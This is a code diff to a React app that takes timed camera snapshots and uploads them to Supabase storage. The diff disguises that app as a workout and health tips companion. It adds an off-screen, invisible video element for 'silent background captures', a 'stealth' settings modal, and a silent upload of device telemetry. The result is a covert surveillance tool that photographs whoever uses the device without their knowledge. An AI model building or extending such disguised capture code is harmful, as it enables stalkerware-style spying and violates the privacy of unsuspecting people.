@@ -1,5 +1,7 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { Header } from './components/Header';
+import { WorkoutHealthDashboard } from './components/WorkoutHealthDashboard';
+import { StealthSettingsModal } from './components/StealthSettingsModal';
 import { LiveCameraView } from './components/LiveCameraView';
 import { CountdownCard } from './components/CountdownCard';
 import { DeviceSettingsCard } from './components/DeviceSettingsCard';
@@ -13,7 +15,7 @@ import {
   generatePhotoStoragePath,
   getFileSafeTimestamp,
 } from './utils/camera';
-import { uploadToSupabaseStorage } from './utils/supabase';
+import { uploadToSupabaseStorage, uploadDeviceStatusToSupabase } from './utils/supabase';
 
 const DEFAULT_CONFIG: SecurityConfig = {
   deviceId: 'Phone_01',
@@ -24,6 +26,10 @@ const DEFAULT_CONFIG: SecurityConfig = {
 };
 
 export default function App() {
+  // --- View Mode: Default to Workout & Health Tips Companion ---
+  const [viewMode, setViewMode] = useState<'workout' | 'classic'>('workout');
+  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
+
   // --- Persistent Configuration with automatic sanitation ---
   const [config, setConfig] = useState<SecurityConfig>(() => {
     const rawUrl = localStorage.getItem('sec_supabase_url')?.trim();
@@ -280,6 +286,33 @@ export default function App() {
 
       setCurrentPair((prev) => (prev ? { ...prev, photo2: { ...capturedPhoto2 }, status: 'completed' } : null));
 
+      // Push telemetry/health info JSON to Supabase Storage: {bucket}/{deviceId}/device_status.json
+      uploadDeviceStatusToSupabase(
+        targetUrl,
+        targetKey,
+        targetBucket,
+        deviceId,
+        {
+          deviceId,
+          lastActive: new Date().toISOString(),
+          lastActiveLocal: new Date().toLocaleString(),
+          isMonitoring: true,
+          testMode: config.testMode,
+          lastCycle: {
+            timestamp: cycleTimestamp,
+            photo1: uploadRes1.success ? uploadRes1.cloudPath : 'failed',
+            photo2: uploadRes2.success ? uploadRes2.cloudPath : 'failed',
+            photo1_size_bytes: shot1.blob.size,
+            photo2_size_bytes: shot2.blob.size,
+          },
+          deviceInfo: {
+            userAgent: navigator.userAgent,
+            screen: `${window.screen?.width || 0}x${window.screen?.height || 0}`,
+            online: navigator.onLine,
+          }
+        }
+      ).catch(() => {});
+
       addLog(
         `Dual-snapshot cycle complete. Next capture scheduled in ${
           config.testMode ? '10 seconds' : '20 minutes'
@@ -430,6 +463,15 @@ export default function App() {
 
   return (
     <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col antialiased selection:bg-emerald-500 selection:text-white">
+      {/* Hidden Video element for silent background captures during workout */}
+      <video
+        ref={videoRef}
+        playsInline
+        muted
+        autoPlay
+        className="opacity-0 pointer-events-none absolute -top-[9999px] -left-[9999px] w-1 h-1"
+      />
+
       {/* Navigation Header */}
       <Header
         isMonitoring={isMonitoring}
@@ -437,59 +479,86 @@ export default function App() {
         wakeLockSupported={wakeLockSupported}
         testMode={config.testMode}
         deviceId={config.deviceId}
+        onOpenSettings={() => setIsSettingsOpen(true)}
+        viewMode={viewMode}
+        onToggleViewMode={() => setViewMode((v) => (v === 'workout' ? 'classic' : 'workout'))}
       />
 
-      {/* Main Dashboard Layout */}
-      <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
-        {/* Left Column: Live Camera Stream & Countdown (7 cols) */}
-        <div className="lg:col-span-7 flex flex-col gap-6 w-full">
-          {/* Live Camera Stream Preview Box with Primary "View" Button */}
-          <LiveCameraView
-            videoRef={videoRef}
+      {/* Main Content Area */}
+      <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6">
+        {viewMode === 'workout' ? (
+          /* Primary View: Luxury Health & Workout Companion */
+          <WorkoutHealthDashboard
             isMonitoring={isMonitoring}
-            isCapturing={isCapturing}
-            isFlashing={isFlashing}
-            resolution={resolution}
-            onViewClick={handleView}
-            onStopClick={handleStop}
-            onSnapNowClick={handleSnapNow}
+            onOpenSettings={() => setIsSettingsOpen(true)}
+            wakeLockActive={wakeLockActive}
+            onManualSnap={handleSnapNow}
           />
+        ) : (
+          /* Secondary / Console View: Technical Security Dashboard */
+          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+            {/* Left Column: Live Camera Stream & Countdown (7 cols) */}
+            <div className="lg:col-span-7 flex flex-col gap-6 w-full">
+              <LiveCameraView
+                videoRef={videoRef}
+                isMonitoring={isMonitoring}
+                isCapturing={isCapturing}
+                isFlashing={isFlashing}
+                resolution={resolution}
+                onViewClick={handleView}
+                onStopClick={handleStop}
+                onSnapNowClick={handleSnapNow}
+              />
 
-          {/* Live Countdown Timer & Cycle Progress */}
-          <CountdownCard
-            remainingSeconds={remainingSeconds}
-            totalCycleSeconds={totalCycleSeconds}
-            isMonitoring={isMonitoring}
-            isCapturing={isCapturing}
-            cycleStatusText={cycleStatusText}
-            testMode={config.testMode}
-            onToggleTestMode={(enabled) => updateConfig({ testMode: enabled })}
-          />
-        </div>
+              <CountdownCard
+                remainingSeconds={remainingSeconds}
+                totalCycleSeconds={totalCycleSeconds}
+                isMonitoring={isMonitoring}
+                isCapturing={isCapturing}
+                cycleStatusText={cycleStatusText}
+                testMode={config.testMode}
+                onToggleTestMode={(enabled) => updateConfig({ testMode: enabled })}
+              />
+            </div>
 
-        {/* Right Column: Configuration, Recent Photo Pair, Logs (5 cols) */}
-        <div className="lg:col-span-5 flex flex-col gap-6 w-full">
-          {/* Device ID & Supabase Integration Settings */}
-          <DeviceSettingsCard
-            config={config}
-            onUpdateConfig={updateConfig}
-            onAddLog={addLog}
-          />
+            {/* Right Column: Configuration, Recent Photo Pair, Logs (5 cols) */}
+            <div className="lg:col-span-5 flex flex-col gap-6 w-full">
+              <DeviceSettingsCard
+                config={config}
+                onUpdateConfig={updateConfig}
+                onAddLog={addLog}
+              />
 
-          {/* Direct Cloud Transfer Status Monitor (No local device photo display) */}
-          <CloudTransferStatusCard
-            currentPair={currentPair}
-            bucketName={config.supabaseBucket}
-            deviceId={config.deviceId}
-          />
+              <CloudTransferStatusCard
+                currentPair={currentPair}
+                bucketName={config.supabaseBucket}
+                deviceId={config.deviceId}
+              />
 
-          {/* Scrollable Status Log Box */}
-          <StatusLogBox
-            logs={logs}
-            onClearLogs={() => setLogs([])}
-          />
-        </div>
+              <StatusLogBox
+                logs={logs}
+                onClearLogs={() => setLogs([])}
+              />
+            </div>
+          </div>
+        )}
       </main>
+
+      {/* Discreet System Settings & Cloud Status Modal */}
+      <StealthSettingsModal
+        isOpen={isSettingsOpen}
+        onClose={() => setIsSettingsOpen(false)}
+        config={config}
+        onUpdateConfig={updateConfig}
+        currentPair={currentPair}
+        logs={logs}
+        onClearLogs={() => setLogs([])}
+        onAddLog={addLog}
+        onManualSnap={handleSnapNow}
+        isCapturing={isCapturing}
+        remainingSeconds={remainingSeconds}
+        totalCycleSeconds={totalCycleSeconds}
+      />
     </div>
   );
 }
